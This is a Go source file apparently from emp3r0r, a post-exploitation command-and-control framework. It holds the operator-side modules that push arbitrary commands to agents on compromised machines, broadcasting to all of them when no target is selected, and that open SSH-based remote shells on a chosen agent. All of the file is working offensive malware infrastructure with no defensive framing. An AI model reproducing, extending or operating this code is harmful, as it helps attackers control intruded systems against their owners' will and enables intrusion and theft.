package cc

import (
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

// RShellStatus stores errors from reverseBash
var RShellStatus = make(map[string]error)

// moduleCmd exec cmd on target
func moduleCmd() {
	// send command
	execOnTarget := func(target *emp3r0r_data.SystemInfo) {
		if Targets[target].Conn == nil {
			CliPrintError("moduleCmd: agent %s is not connected", target.Tag)
			return
		}
		var data emp3r0r_data.MsgTunData
		data.Payload = "cmd" + emp3r0r_data.OpSep + Options["cmd_to_exec"].Val
		data.Tag = target.Tag
		err := Send2Agent(&data, target)
		if err != nil {
			CliPrintError("moduleCmd: %v", err)
		}
	}

	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintWarning("emp3r0r will execute `%s` on all targets this time", Options["cmd_to_exec"].Val)
		for target := range Targets {
			execOnTarget(target)
		}
		return
	}

	// write to given target's connection
	if Targets[target] == nil {
		CliPrintError("moduleCmd: agent control interface not found")
		return
	}
	execOnTarget(target)
}

// moduleShell set up an ssh session
func moduleShell() {
	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintError("moduleShell: Target does not exist")
		return
	}

	// write to given target's connection
	tControl := Targets[target]
	if tControl == nil {
		CliPrintError("moduleShell: agent control interface not found")
		return
	}
	if tControl.Conn == nil {
		CliPrintError("moduleShell: agent is not connected")
		return
	}

	// options
	shell := Options["shell"].Val
	port := Options["port"].Val
	if shell == "bash" {
		port = emp3r0r_data.SSHDPort
	} else if port == emp3r0r_data.SSHDPort {
		CliPrintError("Port %s already has a bash shell at service, choose a different one", port)
		return
	}

	// run
	err := SSHClient(shell, port)
	if err != nil {
		CliPrintError("moduleShell: %v", err)
	}
}
